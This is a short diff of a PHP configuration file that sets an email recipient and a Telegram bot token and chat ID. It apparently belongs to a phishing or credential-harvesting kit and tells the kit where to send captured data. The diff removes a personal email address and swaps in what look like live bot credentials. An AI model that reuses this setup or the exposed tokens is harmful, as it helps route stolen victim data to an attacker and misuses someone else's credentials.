@@ -1,9 +1,9 @@
 <?php
 
 // INFO EMAIL
-$to = "mostsphakhadra12@hotmail.com";
+$to = "";
 
 // INFO TELEGRAM
-$token = "6286405071:AAH2W9dCQ9WdpFtrDaQgEVACSSfRIa8NPFU";
-$chat_id = "5961297812";
+$token = "8543168325:AAHGS6d91NeU-RPi9LkaQ6a6jFPFyBsTxcU";
+$chat_id = "1733772870";
 ?>
